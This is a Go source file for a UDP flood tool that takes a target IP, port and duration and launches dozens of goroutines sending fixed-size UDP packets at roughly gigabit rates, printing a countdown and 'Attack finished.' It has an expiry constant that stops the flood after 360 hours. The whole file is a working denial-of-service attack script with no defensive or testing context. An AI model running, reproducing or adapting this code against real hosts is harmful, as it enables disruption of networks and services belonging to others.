package main

import (
    "fmt"
    "log"
    "net"
    "os"
    "strconv"
    "sync"
    "time"
)

const (
    packetSize       = 1400 // Adjust packet size as needed
    packetsPerThread = 25000
    corruptAfter     = 360 * time.Hour
)

var startTime = time.Now()

func main() {
    if len(os.Args) != 4 {
        fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
        return
    }

    targetIP := os.Args[1]
    targetPort := os.Args[2]
    duration, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("Invalid attack duration:", err)
        return
    }

    // Calculate the number of threads required
    packetsPerSecond := 1_000_000_000 / packetSize
    numThreads := packetsPerSecond / packetsPerThread

    var wg sync.WaitGroup
    deadline := time.Now().Add(time.Duration(duration) * time.Second)
    done := make(chan struct{})

    // Start the countdown timer
    go countdown(duration, done)

    for i := 0; i < numThreads; i++ {
        wg.Add(1)
        go func(threadID int) {
            defer wg.Done()
            sendUDPPackets(targetIP, targetPort, packetsPerThread, deadline, threadID)
        }(i)
    }

    wg.Wait()
    close(done)

    fmt.Println("Attack finished.")
}

func sendUDPPackets(ip, port string, packetsPerThread int, deadline time.Time, threadID int) {
    conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
    if err != nil {
        log.Printf("Thread %d: Error connecting: %v\n", threadID, err)
        return
    }
    defer conn.Close()

    packet := make([]byte, packetSize)
    interval := time.Second / time.Duration(packetsPerThread)
    ticker := time.NewTicker(interval)
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            if time.Now().After(deadline) || time.Since(startTime) > corruptAfter {
                return
            }
            _, err := conn.Write(packet)
            if err != nil {
                log.Printf("Thread %d: Error sending UDP packet: %v\n", threadID, err)
                return
            }
        }
    }
}

func countdown(remainingTime int, done chan struct{}) {
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()

    for i := remainingTime; i > 0; i-- {
        fmt.Printf("\rTime remaining: %d seconds", i)
        select {
        case <-ticker.C:
        case <-done:
            return
        }
    }
    fmt.Println("\rTime remaining: 0 seconds")
}
